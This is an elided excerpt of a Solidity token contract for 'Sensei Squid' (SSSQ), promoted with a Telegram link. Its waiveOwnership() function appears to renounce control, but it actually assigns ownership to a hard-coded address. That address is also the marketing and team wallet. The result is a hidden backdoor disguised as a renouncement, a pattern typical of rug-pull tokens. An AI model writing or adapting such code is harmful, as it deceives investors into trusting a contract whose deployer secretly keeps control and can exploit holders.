...
/**
Telegram : https://t.me/SenseiSquid
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x23f3968238958cB2D38bA5C18b0f542af33F3896);
    }
...
contract SenseiSquid is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Sensei Squid";
    string private _symbol = "SSSQ";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x23f3968238958cB2D38bA5C18b0f542af33F3896);
    address payable private teamWalletAddress = payable(0x23f3968238958cB2D38bA5C18b0f542af33F3896);
